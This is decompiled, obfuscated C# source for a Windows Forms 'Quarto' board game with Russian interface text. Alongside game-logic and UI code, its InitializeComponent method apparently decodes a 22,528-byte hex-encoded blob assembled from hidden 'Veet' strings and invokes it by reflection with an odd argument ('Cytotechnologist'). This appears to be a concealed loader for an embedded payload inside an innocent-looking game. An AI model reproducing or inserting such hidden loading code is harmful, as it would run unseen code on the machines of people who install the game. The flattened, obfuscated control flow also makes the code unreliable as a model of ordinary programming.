					num = 889586923;
					continue;
				case 53u:
				{
					int num26;
					int num27;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num26 = -1099369056;
						num27 = -1099369056;
					}
					else
					{
						num26 = -700235350;
						num27 = -700235350;
					}
					num = num26 ^ ((int)num2 * -570995696);
					continue;
				}
				case 52u:
				{
					int num10;
					int num11;
					if (mem[0, 0] == null)
					{
						num10 = -182580318;
						num11 = -182580318;
					}
					else
					{
						num10 = -1991853054;
						num11 = -1991853054;
					}
					num = num10 ^ (int)(num2 * 261392950);
					continue;
				}
				case 51u:
				{
					int num71;
					int num72;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num71 = 3720433;
						num72 = 3720433;
					}
					else
					{
						num71 = 130696988;
						num72 = 130696988;
					}
					num = num71 ^ (int)(num2 * 1561892692);
					continue;
				}
				case 50u:
					flag = false;
					num = (int)((num2 * 581170501) ^ 0x215840B1);
					continue;
				case 49u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)((num2 * 798451753) ^ 0x61D44866);
						continue;
					}
					goto IL_054a;
				case 48u:
				{
					int num61;
					int num62;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num61 = 2066982949;
						num62 = 2066982949;
					}
					else
					{
						num61 = 1707195124;
						num62 = 1707195124;
					}
					num = num61 ^ ((int)num2 * -506377471);
					continue;
				}
				case 47u:
					if (mem[0, num3] != null)
					{
						num = 259288642;
						continue;
					}
					goto IL_01da;
				case 46u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -1189501516) ^ 0x306B9DE1;
						continue;
					}
					goto IL_01da;
				case 45u:
				{
					int num50;
					int num51;
					if (mem[num3, 3] != null)
					{
						num50 = 1414587278;
						num51 = 1414587278;
					}
					else
					{
						num50 = 798556083;
						num51 = 798556083;
					}
					num = num50 ^ ((int)num2 * -537119594);
					continue;
				}
				case 44u:
				{
					int num43;
					int num44;
					if (mem[2, 2] == null)
					{
						num43 = -341737594;
						num44 = -341737594;
					}
					else
					{
						num43 = -931244492;
						num44 = -931244492;
					}
					num = num43 ^ (int)(num2 * 1695140040);
					continue;
				}
				case 43u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1753314185;
						continue;
					}
					goto IL_040d;
				case 41u:
					flag = true;
					num = ((int)num2 * -716478247) ^ -338443695;
					continue;
				case 40u:
				{
					int num40;
					int num41;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num40 = 306628099;
						num41 = 306628099;
					}
					else
					{
						num40 = 1520987509;
						num41 = 1520987509;
					}
					num = num40 ^ (int)(num2 * 2079330298);
					continue;
				}
				case 39u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -835204595) ^ -1825688559;
						continue;
					}
					goto IL_06d4;
				case 38u:
				{
					int num30;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = 1363538837;
						num30 = 1363538837;
					}
					else
					{
						num = 1045819871;
						num30 = 1045819871;
					}
					continue;
				}
				case 37u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -2061354473) ^ -1276066987;
						continue;
					}
					goto IL_0741;
				case 36u:
				{
					int num25;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = 2126149906;
						num25 = 2126149906;
					}
					else
					{
						num = 1612601050;
						num25 = 1612601050;
					}
					continue;
				}
				case 35u:
				{
					int num16;
					int num17;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num16 = 1663725198;
						num17 = 1663725198;
					}
					else
					{
						num16 = 1531340989;
						num17 = 1531340989;
					}
					num = num16 ^ (int)(num2 * 1473154263);
					continue;
				}
				case 34u:
				{
					int num8;
					int num9;
					if (mem[num3, 0] != null)
					{
						num8 = 311014441;
						num9 = 311014441;
					}
					else
					{
						num8 = 291860527;
						num9 = 291860527;
					}
					num = num8 ^ ((int)num2 * -731500684);
					continue;
				}
				case 33u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1798670122) ^ -1952146563;
						continue;
					}
					goto IL_0035;
				case 32u:
				{
					int num69;
					int num70;
					if (!flag3)
					{
						num69 = 121137355;
						num70 = 121137355;
					}
					else
					{
						num69 = 928092381;
						num70 = 928092381;
					}
					num = num69 ^ (int)(num2 * 974728838);
					continue;
				}
				case 31u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -1192892029) ^ -2054926182;
						continue;
					}
					goto IL_0741;
				case 30u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 1357087221) ^ 0x28B455BB);
						continue;
					}
					goto IL_0898;
				case 29u:
					num29 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0036;
				case 28u:
				{
					int num66;
					int num67;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num66 = 1920707856;
						num67 = 1920707856;
					}
					else
					{
						num66 = 483907200;
						num67 = 483907200;
					}
					num = num66 ^ ((int)num2 * -1503037935);
					continue;
				}
				case 27u:
				{
					int num59;
					int num60;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num59 = 1885868018;
						num60 = 1885868018;
					}
					else
					{
						num59 = 1688221668;
						num60 = 1688221668;
					}
					num = num59 ^ (int)(num2 * 1589540305);
					continue;
				}
				case 26u:
					flag = true;
					num = (int)(num2 * 2076351924) ^ -704048915;
					continue;
				case 25u:
				{
					int num57;
					int num58;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num57 = 903034874;
						num58 = 903034874;
					}
					else
					{
						num57 = 198189750;
						num58 = 198189750;
					}
					num = num57 ^ ((int)num2 * -352920246);
					continue;
				}
				case 24u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -1299866029) ^ 0x6C7F8C9C;
						continue;
					}
					goto IL_06d4;
				case 23u:
				{
					int num52;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = 607524076;
						num52 = 607524076;
					}
					else
					{
						num = 1001309018;
						num52 = 1001309018;
					}
					continue;
				}
				case 22u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)((num2 * 1923612208) ^ 0xB00EED5);
						continue;
					}
					goto IL_0035;
				case 21u:
				{
					int num45;
					int num46;
					if (mem[num3, 2] != null)
					{
						num45 = 884085754;
						num46 = 884085754;
					}
					else
					{
						num45 = 1385475435;
						num46 = 1385475435;
					}
					num = num45 ^ ((int)num2 * -171303804);
					continue;
				}
				case 20u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 756312875) ^ -694489201;
						continue;
					}
					goto IL_0741;
				case 19u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1703127676) ^ -2012187282;
						continue;
					}
					goto IL_0741;
				case 18u:
				{
					int num42;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = 922788160;
						num42 = 922788160;
					}
					else
					{
						num = 1305317627;
						num42 = 1305317627;
					}
					continue;
				}
				case 17u:
					num3 = 0;
					num = (int)(num2 * 417008245) ^ -852714993;
					continue;
				case 16u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = (int)((num2 * 753797204) ^ 0x6C6D34C7);
						continue;
					}
					goto IL_06d4;
				case 15u:
				{
					int num36;
					int num37;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num36 = -45817864;
						num37 = -45817864;
					}
					else
					{
						num36 = -1877643750;
						num37 = -1877643750;
					}
					num = num36 ^ ((int)num2 * -604835611);
					continue;
				}
				case 14u:
				{
					int num33;
					int num34;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num33 = -1982309297;
						num34 = -1982309297;
					}
					else
					{
						num33 = -971275037;
						num34 = -971275037;
					}
					num = num33 ^ ((int)num2 * -1470602607);
					continue;
				}
				case 13u:
				{
					int num31;
					if (num3 < 4)
					{
						num = 843076905;
						num31 = 843076905;
					}
					else
					{
						num = 91595660;
						num31 = 91595660;
					}
					continue;
				}
				case 12u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1695562879) ^ -1058615106;
						continue;
					}
					goto IL_0898;
				case 11u:
					if (mem[2, 1] != null)
					{
						num = (int)(num2 * 1681266079) ^ -425947271;
						continue;
					}
					goto IL_0898;
				case 10u:
					result = flag;
					num = 739545274;
					continue;
				case 9u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -2114198945) ^ -2074959512;
						continue;
					}
					goto IL_06d4;
				case 8u:
					if (mem[0, 3] != null)
					{
						num = 1805097325;
						continue;
					}
					goto IL_0898;
				case 7u:
				{
					int num28;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 2100537113;
						num28 = 2100537113;
					}
					else
					{
						num = 1807785011;
						num28 = 1807785011;
					}
					continue;
				}
				case 6u:
				{
					int num22;
					int num23;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num22 = 867248761;
						num23 = 867248761;
					}
					else
					{
						num22 = 574479658;
						num23 = 574479658;
					}
					num = num22 ^ ((int)num2 * -1847395345);
					continue;
				}
				case 5u:
				{
					int num14;
					int num15;
					if (mem[num3, 1] != null)
					{
						num14 = 681808262;
						num15 = 681808262;
					}
					else
					{
						num14 = 1999182819;
						num15 = 1999182819;
					}
					num = num14 ^ (int)(num2 * 1269327384);
					continue;
				}
				case 4u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)(num2 * 797232211) ^ -710660679;
						continue;
					}
					goto IL_054a;
				case 3u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)(num2 * 485099308) ^ -951114942;
						continue;
					}
					goto IL_054a;
				case 2u:
				{
					int num4;
					int num5;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num4 = -1988026240;
						num5 = -1988026240;
					}
					else
					{
						num4 = -1337099317;
						num5 = -1337099317;
					}
					num = num4 ^ ((int)num2 * -1745875463);
					continue;
				}
				case 1u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -2108637794) ^ 0x22BF557E;
						continue;
					}
					goto IL_01da;
				case 0u:
					num3++;
					num = ((int)num2 * -1615462735) ^ -98624538;
					continue;
				case 42u:
					break;
				default:
					{
						return result;
					}
					IL_0035:
					num29 = 1;
					goto IL_0036;
					IL_0741:
					num29 = 1;
					goto IL_0036;
					IL_06d4:
					num35 = 1;
					goto IL_0167;
					IL_0285:
					num35 = 0;
					goto IL_0167;
					IL_040d:
					num29 = 0;
					goto IL_0036;
					IL_0167:
					flag3 = (byte)num35 != 0;
					num = 1785548733;
					continue;
					IL_0036:
					flag2 = (byte)num29 != 0;
					num = 181553543;
					continue;
					IL_0898:
					num29 = 0;
					goto IL_0036;
					IL_054a:
					num35 = 1;
					goto IL_0167;
					IL_01da:
					num35 = 0;
					goto IL_0167;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag3 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 2001875964;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x74FB128Au) % 14u)
				{
				case 13u:
				{
					int num7;
					int num8;
					if (flag3)
					{
						num7 = -37816815;
						num8 = -37816815;
					}
					else
					{
						num7 = -1450941054;
						num8 = -1450941054;
					}
					num = num7 ^ ((int)num2 * -1884660775);
					continue;
				}
				case 12u:
					num3++;
					num = (int)((num2 * 778162926) ^ 0x115F82FF);
					continue;
				case 11u:
				{
					int num9;
					if (num4 < 4)
					{
						num = 1400977550;
						num9 = 1400977550;
					}
					else
					{
						num = 2077118876;
						num9 = 2077118876;
					}
					continue;
				}
				case 10u:
					flag2 = true;
					num3 = 0;
					num = (int)(num2 * 1189959641) ^ -263741555;
					continue;
				case 9u:
					flag3 = num3 < 4;
					num = 1108918353;
					continue;
				case 8u:
					flag2 = false;
					num = ((int)num2 * -1643058358) ^ -148499413;
					continue;
				case 7u:
					num = (int)(num2 * 623444168) ^ -1577528137;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -1340356312;
						num6 = -1340356312;
					}
					else
					{
						num5 = -1870779875;
						num6 = -1870779875;
					}
					num = num5 ^ (int)(num2 * 1291484461);
					continue;
				}
				case 4u:
					num4 = 0;
					num = 1252158647;
					continue;
				case 3u:
					num4++;
					num = 525814559;
					continue;
				case 1u:
					result = flag2;
					num = ((int)num2 * -920114916) ^ -1581674854;
					continue;
				case 0u:
					flag = mem[num3, num4] == null;
					num = 140220173;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 1210962179;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x46AC20D3u) % 9u)
				{
				case 7u:
					num = ((int)num2 * -536087099) ^ 0x6973AF3;
					continue;
				case 6u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -1023335584) ^ 0x61D32291;
					continue;
				case 5u:
					num = (int)(num2 * 1734243254) ^ -1596886315;
					continue;
				case 4u:
					num = ((int)num2 * -320169627) ^ -172922333;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1903228500) ^ -1846660100;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -1161292288) ^ -331595187;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 1210250202) ^ 0x6C927935);
					continue;
				default:
					return;
				case 8u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -742880510;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xAD2361D3u) % 10u)
				{
				case 9u:
					if (disposing)
					{
						num = (int)(num2 * 1305554365) ^ -1893905809;
						continue;
					}
					num5 = 0;
					goto IL_001c;
				case 7u:
					num = ((int)num2 * -604985431) ^ 0x54194AC7;
					continue;
				case 5u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_001c;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 611396964;
						num4 = 611396964;
					}
					else
					{
						num3 = 1508552769;
						num4 = 1508552769;
					}
					num = num3 ^ (int)(num2 * 775011406);
					continue;
				}
				case 3u:
					num = (int)((num2 * 607050649) ^ 0x2AB7B595);
					continue;
				case 2u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -741897687) ^ -1721235308;
					continue;
				case 1u:
					((Form)this).Dispose(disposing);
					num = -1052349857;
					continue;
				case 0u:
					num = (int)(num2 * 1591999486) ^ -1685792875;
					continue;
				default:
					return;
				case 8u:
					break;
				case 6u:
					return;
					IL_001c:
					flag = (byte)num5 != 0;
					num = -669304785;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_05e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f3: Expected O, but got Unknown
		string string_ = default(string);
		byte[] array = default(byte[]);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1024049213;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x86FE3C70u) % 131u)
				{
				case 130u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)(num2 * 443964175) ^ -1746259845;
					continue;
				case 129u:
					num = ((int)num2 * -612643734) ^ -569645546;
					continue;
				case 128u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1455104833) ^ 0xBB16379;
					continue;
				case 127u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)((num2 * 736307654) ^ 0x13449160);
					continue;
				case 126u:
					num = ((int)num2 * -1313527072) ^ -1086279401;
					continue;
				case 125u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 524834552) ^ 0x2E0A9855);
					continue;
				case 124u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -726526574) ^ -1612265842;
					continue;
				case 123u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1105901817) ^ 0x3C6606C0;
					continue;
				case 122u:
					num = (int)((num2 * 1842428391) ^ 0x1482E295);
					continue;
				case 121u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1715116097) ^ 0x761C2A5;
					continue;
				case 120u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1675833599) ^ 0x75728A23;
					continue;
				case 119u:
					num = -883141582;
					continue;
				case 118u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -541495074) ^ 0x6A0C6FBD;
					continue;
				case 117u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -798046928) ^ 0xE0F98EB;
					continue;
				case 116u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 442600202) ^ 0x182159F2);
					continue;
				case 115u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 2134745818) ^ -239720657;
					continue;
				case 114u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 1856210080) ^ 0x6F1FDC91);
					continue;
				case 113u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 402428204) ^ 0x40D32927);
					continue;
				case 112u:
					button1 = Form1.smethod_53();
					num = (int)((num2 * 1479915056) ^ 0x4FB5B41A);
					continue;
				case 111u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1196526770) ^ -1302210216;
					continue;
				case 110u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)(num2 * 1747873108) ^ -1000103358;
					continue;
				case 109u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)(num2 * 2026401384) ^ -1160732980;
					continue;
				case 108u:
					num = (int)((num2 * 337005970) ^ 0x5E776539);
					continue;
				case 107u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1737751731) ^ -1180911946;
					continue;
				case 106u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 1301612807) ^ -667677362;
					continue;
				case 105u:
					num = ((int)num2 * -642578275) ^ -239821610;
					continue;
				case 104u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -500714054) ^ -1723657598;
					continue;
				case 103u:
					num = ((int)num2 * -1639443945) ^ 0x3B01E778;
					continue;
				case 102u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 757911195) ^ -1441515614;
					continue;
				case 101u:
					string_ = Veet.Sa;
					num = ((int)num2 * -165264515) ^ -1358412331;
					continue;
				case 100u:
					num = (int)((num2 * 405580592) ^ 0x174BB6C2);
					continue;
				case 99u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1536741272) ^ 0x10DF04C2;
					continue;
				case 98u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1445967433) ^ 0x556A3DB5;
					continue;
				case 97u:
					num = (int)((num2 * 1410495682) ^ 0x30A06FC4);
					continue;
				case 96u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1337068324) ^ -1059823490;
					continue;
				case 95u:
					num = ((int)num2 * -531074452) ^ 0x56C3A0BA;
					continue;
				case 94u:
					num = (int)(num2 * 183940263) ^ -1467190463;
					continue;
				case 93u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -850994885) ^ -1354426490;
					continue;
				case 92u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 515428724) ^ -1279873852;
					continue;
				case 91u:
					array = new byte[22528];
					num = ((int)num2 * -241856448) ^ -1386246127;
					continue;
				case 90u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 320019093) ^ 0x6D5B2EDE);
					continue;
				case 89u:
					num = (int)(num2 * 2085779271) ^ -1554069951;
					continue;
				case 88u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 1349326193) ^ 0x7002A41B);
					continue;
				case 87u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1641057747) ^ -1055758420;
					continue;
				case 86u:
					num3 = 0;
					num = ((int)num2 * -22330367) ^ 0x7EE14B16;
					continue;
				case 85u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 2105498202) ^ -453754250;
					continue;
				case 84u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -1949982783) ^ 0x5AABF128;
					continue;
				case 83u:
					num = ((int)num2 * -736254737) ^ -1037574976;
					continue;
				case 82u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 664383329) ^ 0x1B2473C0);
					continue;
				case 81u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1925544186) ^ -1507770736;
					continue;
				case 80u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1037557822) ^ 0x450727F5;
					continue;
				case 79u:
					num = ((int)num2 * -926511724) ^ 0x78935751;
					continue;
				case 78u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -915964059) ^ 0x35606E6F;
					continue;
				case 77u:
					num = ((int)num2 * -1106945892) ^ -1140962762;
					continue;
				case 76u:
					num = ((int)num2 * -681455548) ^ -1216774816;
					continue;
				case 75u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)(num2 * 1410130369) ^ -664733299;
					continue;
				case 74u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 646810567) ^ -1717949648;
					continue;
				case 73u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1680366598) ^ 0x393DE4F1;
					continue;
				case 72u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -1775476574) ^ 0x3CA3B38;
					continue;
				case 71u:
					num = ((int)num2 * -2065989126) ^ 0x4C51DBB3;
					continue;
				case 70u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1039719503) ^ 0x542A14D4);
					continue;
				case 69u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 59161199) ^ -1199748465;
					continue;
				case 68u:
					num = (int)((num2 * 1480642615) ^ 0x72880DA6);
					continue;
				case 67u:
					num = (int)(num2 * 956112831) ^ -773487043;
					continue;
				case 66u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -1977332672) ^ -618985047;
					continue;
				case 65u:
					num = ((int)num2 * -2106209377) ^ 0xF3F5F2;
					continue;
				case 64u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -533551004) ^ -1246185439;
					continue;
				case 63u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1404092232) ^ -912713732;
					continue;
				case 62u:
					num = (int)(num2 * 9230111) ^ -1041156482;
					continue;
				case 61u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -1873993775) ^ 0x510CFE75;
					continue;
				case 60u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -295127669) ^ 0x2F0B11C0;
					continue;
				case 59u:
					num = ((int)num2 * -1098222009) ^ 0x2ACB2E1C;
					continue;
				case 58u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)((num2 * 355661773) ^ 0x5C65B22E);
					continue;
				case 57u:
					num = (int)(num2 * 1038625109) ^ -938369919;
					continue;
				case 56u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1004286956) ^ 0x7ABAC5F6);
					continue;
				case 55u:
					num = ((int)num2 * -752031718) ^ 0x507F1CCB;
					continue;
				case 54u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 131803593) ^ -1011632436;
					continue;
				case 53u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = ((int)num2 * -1806891477) ^ 0x1AF81685;
					continue;
				case 52u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)((num2 * 832210131) ^ 0x57D8F027);
					continue;
				}
				case 51u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -411147127) ^ -389989622;
					continue;
				case 50u:
					num = ((int)num2 * -1572816834) ^ -1637946912;
					continue;
				case 49u:
					num = (int)(num2 * 1444524552) ^ -603711867;
					continue;
				case 48u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 297260130) ^ 0x6CDE223);
					continue;
				case 47u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 513990186) ^ -1252495562;
					continue;
				case 46u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1989907423;
						num5 = 1989907423;
					}
					else
					{
						num4 = 774521939;
						num5 = 774521939;
					}
					num = num4 ^ ((int)num2 * -781804308);
					continue;
				}
				case 45u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1668057856) ^ 0x49A945A7;
					continue;
				case 44u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 1589896823) ^ 0x25DF5BC4);
					continue;
				case 43u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -2133948370) ^ -2006457563;
					continue;
				case 42u:
					num = ((int)num2 * -1203157133) ^ -2097655591;
					continue;
				case 41u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1204724957) ^ 0x12728F11);
					continue;
				case 40u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					num = ((int)num2 * -293810945) ^ -114754242;
					continue;
				case 39u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num3++;
					num = ((int)num2 * -1792742488) ^ -472834377;
					continue;
				case 38u:
					num = (int)(num2 * 1532790445) ^ -122744530;
					continue;
				case 37u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 963672560) ^ -896576193;
					continue;
				case 36u:
					num = (int)((num2 * 1622434984) ^ 0x2D9246F4);
					continue;
				case 35u:
					num = ((int)num2 * -1861640649) ^ 0x4C0B03F2;
					continue;
				case 34u:
					CharArray(array, string.Empty);
					num = (int)(num2 * 85538633) ^ -242007958;
					continue;
				case 33u:
					num = ((int)num2 * -162548261) ^ 0x581384A6;
					continue;
				case 32u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 176960982) ^ -1347504749;
					continue;
				case 31u:
					num = ((int)num2 * -1846277209) ^ 0x460923E9;
					continue;
				case 30u:
					num = (int)(num2 * 1671879566) ^ -1382760339;
					continue;
				case 29u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 400669961) ^ -1112588687;
					continue;
				case 28u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -453593436) ^ 0x720C6A53;
					continue;
				case 27u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -359937268) ^ -5655279;
					continue;
				case 26u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -799756085) ^ -409579884;
					continue;
				case 25u:
